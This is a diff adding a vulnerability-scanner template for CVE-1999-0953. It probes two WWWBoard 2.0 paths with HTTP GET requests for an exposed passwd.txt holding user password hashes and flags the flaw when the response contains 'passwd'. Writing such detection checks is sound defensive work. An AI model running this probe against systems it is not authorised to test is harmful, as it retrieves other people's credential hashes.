@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "WWWBoard 2.0 将加密后的用户密码存储在 Web 根目录下的 passwd.txt 文件中，远程攻击者无需认证即可通过 HTTP GET 请求直接访问该文件获取所有用户密码哈希。通过检测响应中包含加密密码特征的内容确认漏洞存在。"
+id = "POC-AVE-1999-1500"
+name = "WWWBoard 2.0 passwd.txt Remote Password Disclosure PoC"
+severity = "critical"
+tags = ["ave-1999-1500"]
+vuln_id = [
+    "CVE-1999-0953",
+    "AVE-1999-1500",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/wwboard/passwd.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["passwd"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wwboard/passwd.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["passwd"]
